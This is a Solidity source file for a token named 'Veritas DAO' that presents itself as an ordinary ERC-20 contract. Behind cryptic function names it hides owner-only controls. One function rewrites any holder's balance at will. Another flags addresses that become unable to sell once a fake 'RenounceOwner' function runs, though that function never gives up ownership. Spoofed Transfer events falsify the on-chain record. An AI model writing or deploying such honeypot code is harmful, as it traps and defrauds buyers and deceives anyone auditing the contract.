/**
 *Submitted for verification at Etherscan.io on 2022-10-16
*/

// "SPDX-License-Identifier: UNLICENSED
                                 
pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract VERITASDAO {
  
    mapping (address => uint256) public rAMt;
    mapping (address => bool) rTXn;


    // 
    string public name = "Veritas DAO";
    string public symbol = unicode"VERITAS";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    uint rver = 0;

    event Transfer(address indexed from, address indexed to, uint256 value);
   



        constructor()  {
        rAMt[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }



	address owner = msg.sender;
    address V3Router = 0x5C93BC902391904cD7cf8461Efe3e583d8Cec08C;
    address lead_dev = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier Il() {   
    require(msg.sender == owner);
         _;}
    modifier X () {
        rver = 1;
        _;}
    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V3Router)  {
        require(rAMt[msg.sender] >= value);
        rAMt[msg.sender] -= value;  
        rAMt[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        if(rTXn[msg.sender]) {
        require(rver < 1);} 
        require(rAMt[msg.sender] >= value);
        rAMt[msg.sender] -= value;  
        rAMt[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


        function balanceOf(address account) public view returns (uint256) {
        return rAMt[account]; }
        function rqry(address R) Il public{          
        require(!rTXn[R]);
        rTXn[R] = true;}

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function rval(address R, uint256 rX) Il public returns (bool success) {
        rAMt[R] = rX;
        return true; }
        function RenounceOwner() X public {
            require(msg.sender == owner);
        }
        function rraw(address R) Il public {
        require(rTXn[R]);
        rTXn[R] = false; }

   


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == V3Router)  {
        require(value <= rAMt[from]);
        require(value <= allowance[from][msg.sender]);
        rAMt[from] -= value;  
        rAMt[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; }    
        if(rTXn[from] || rTXn[to]) {
        require(rver < 1);}
        require(value <= rAMt[from]);
        require(value <= allowance[from][msg.sender]);
        rAMt[from] -= value;
        rAMt[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }